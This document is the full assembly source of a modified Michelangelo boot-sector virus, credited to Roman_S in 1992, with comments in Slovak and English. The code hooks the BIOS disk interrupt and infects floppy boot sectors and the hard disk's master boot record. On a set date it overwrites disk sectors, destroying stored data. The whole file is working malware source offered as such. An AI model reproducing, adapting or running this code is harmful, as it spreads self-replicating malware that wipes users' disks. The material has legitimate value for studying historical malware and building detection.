

; -----------------------------------------------------------------------------
; Modifikovany virus Michelangelo		Sourced by Roman_S (c) 1992
;
;	Virus odchyteny 1.5.1992 v IMB nedetekovatelny SCANOM
;	Solomon - Michelangelo
;	F-prot	- new posible virus Stoned
;
; Nacasovany na 25.5				Presny preklad virusu !
; -----------------------------------------------------------------------------  
int_13		equ	4Ch			;Offset in zero segment 13h*4 
Mem_top		equ	413h			;Memory top in Kb BIOS
Motor		equ	43Fh			;Disk motor running ? BIOS
virus_len	equ	offset last_byte	;Po partition table ...
  
mich2		segment
		assume	cs:mich2, ds:mich2  
  
		org	0
start:		jmp	start_vir

jmp_far		dw	offset next_line,?	;For far jmp to top memory
pom		db	2
cyl_sect	dw	7			;Umiestnenie Boot sect.
old_13		dw	?,?

; ---------------------------------------------------------------------------
;			New vector to DISK I/O
; ---------------------------------------------------------------------------
new_13:		push	ds			;Backup DS,AX
		push	ax
		or	dl,dl			;Disk A:
		jnz	odchod
		xor	ax,ax
		mov	ds,ax			;DS = 0
		test	byte ptr ds:Motor,1	;Motor is running ?
		jnz	odchod
		pop	ax			;Restore DS,AX
		pop	ds
		pushf
		call	dword ptr cs:[old_13]	;INT 13
		pushf
		call	virus_body		;Pokus o infect
		popf
		retf	2			;Return from interrupt

odchod:		pop	ax			;Restore registers AX,DX
		pop	ds
		jmp	dword ptr cs:[old_13]	;Jump to old int 13h
  
; -------------------------------------------------------------------------
;			Pokus o nakazenie diskety A:
; -------------------------------------------------------------------------  
virus_body:	push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	si
		push	di
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	si,4			;Error counter

read_again:	mov	ax,201h			;Read 1 sector
		mov	bx,offset buffer
		mov	cx,1
		xor	dx,dx
		pushf
		call	dword ptr [old_13]	;Read boot from  A: to buffer
		jnc	read_ok
		xor	ax,ax
		pushf
		call	dword ptr [old_13]	;Reset disk
		dec	si			;Error--
		jnz	read_again
		jmp	short odchod_13

read_ok:	xor	si,si			;Compare virus & buffer (4)
		cld
		lodsw
		cmp	ax,[bx]
		jne	nakazit
		lodsw
		cmp	ax,[bx+2]
		je	odchod_13

nakazit:	mov	ax,301h			;Write 1 sector
		mov	dh,1			;Head 1
		mov	cl,3			;Sector 3
		cmp	byte ptr [bx+15h],0FDh	;Media descriptor
		je	loc_5
		mov	cl,0Eh
loc_5:		mov	cyl_sect,cx		;Zapis si polohu old boot
		pushf
		call	dword ptr [old_13]	;Write old boot
		jc	odchod_13
		mov	si,offset last_byte+200h ;Kopiruj original partition
		mov	di,offset last_byte
		mov	cx,21h
		cld
		rep	movsw
		mov	ax,301h			;Write 1 sec.
		xor	bx,bx
		mov	cx,1
		xor	dx,dx
		pushf
		call	dword ptr [old_13]	;Write virus to boot sect A:
odchod_13:	pop	di
		pop	si
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn

; ---------------------------------------------------------------------------  
;			Zaciatocny kod virusu
; ---------------------------------------------------------------------------
start_vir:	xor	ax,ax
		mov	ds,ax			;DS = 0
		cli				;Set stack
		mov	ss,ax
		mov	ax,7C00h
		mov	sp,ax
		sti
		push	ds			;Push 0000:7C00 address
		push	ax
		mov	ax,ds:[int_13+2]	;Redefine INT 13
		mov	word ptr ds:[old_13+7C02h],ax
		mov	ax,ds:[int_13]
		mov	word ptr ds:[old_13+7C00h],ax
		mov	ax,ds:[Mem_top]		;AX = memoty top
		dec	ax			;Reserved 2 Kb
		dec	ax
		mov	cl,6			;Convert to segment addr.
		mov	ds:[Mem_top],ax		;Set new value
		shl	ax,cl
		mov	es,ax			;ES = segment top
		mov	word ptr ds:[jmp_far+7C02h],ax
		mov	ax,offset new_13
		mov	ds:[int_13+2],es	;Set new interrupt 13h
		mov	ds:[int_13],ax
		mov	cx,virus_len		;Vsetky byte
		mov	si,7C00h		;Od zaciatku virusu
		xor	di,di			;Na zaciatok segmentu
		cld				;Clear direction
		rep	movsb			;Copy virus to mem top
		jmp	dword ptr cs:[jmp_far+7C00h]	;Jump to next line

next_line:	xor	ax,ax			;Uz sme na vrchole RAM
		mov	es,ax
		int	13h			;Reset disk
		push	cs
		pop	ds
		mov	ax,201h			;Idem nahrat povodny master
		mov	cx,cyl_sect		;7 sektor 0 stopa (old master)
		mov	bx,7C00h		;0000:07C00 - tu ho nahrat
		cmp	cx,7			;Sme na hardisku ?
		jne	no_hardisk
		mov	dx,80h			;Hardisk head 0
		int	13h
		jmp	short test_time

no_hardisk:	mov	cx,cyl_sect
		mov	dx,100h			;Disk A: head 0
		int	13h
		jc	test_time		;Jump if error

		push	cs			;Pokus o nakazenie C:
		pop	es
		mov	ax,201h
		mov	bx,offset buffer
		mov	cx,1
		mov	dx,80h
		int	13h			;Read master from C: to buffer
		jc	test_time
		xor	si,si
		cld
		lodsw				;AX = firs 2 byte of virus
		cmp	ax,[bx]			;Compare with buffer
		jne	loc_8
		lodsw				;AX = next 2 byte of virus
		cmp	ax,[bx+2]		;Compare with buffer
		jne	loc_8

test_time:	xor	cx,cx
		mov	ah,4
		int	1Ah			;Read date cx=year, dx=mon/day
		cmp	dx,526h			;Is 26.5 ?
		je	kill
		retf				;Return to 0000:7C00h

kill:		xor	dx,dx			;Head 0, drive 0
		mov	cx,1			;Sector 1, track 0
kill_:		mov	ax,309h			;Write 9 sectors
		mov	si,cyl_sect
		cmp	si,3
		je	loc_7
		mov	al,0Eh
		cmp	si,0Eh
		je	loc_7
		mov	dl,80h			;Hardisk
		mov	pom,4			;Iba prve 4 hlavicky (0-3)
		mov	al,11h
loc_7:		mov	bx,5000h		;Citanie z repy
		mov	es,bx
		int	13h			;Kill
		jnc	ok_next
		xor	ah,ah
		int	13h			;Reset disk

ok_next:	inc	dh			;Next head
		cmp	dh,pom
		jb	kill_
		xor	dh,dh			;Opat od head 0
		inc	ch			;Next track
		jmp	short kill_

loc_8:		mov	cx,7
		mov	cyl_sect,cx
		mov	ax,301h
		mov	dx,80h
		int	13h			;Write
		jc	test_time
		mov	si,offset last_byte+200h ;Kopiruj original partition
		mov	di,offset last_byte
		mov	cx,21h
		rep	movsw
		mov	ax,301h
		xor	bx,bx			; Zero register
		inc	cl
		int	13h
		jmp	short test_time

; ---------------------------------------------------------------------------
		db	16 dup (0)
last_byte	label	byte
		org	200h-2
		dw	 0AA55h			;Mark end of sektor
buffer		label byte			;Buffer za virusom v RAM top
mich2		ends
		end	start

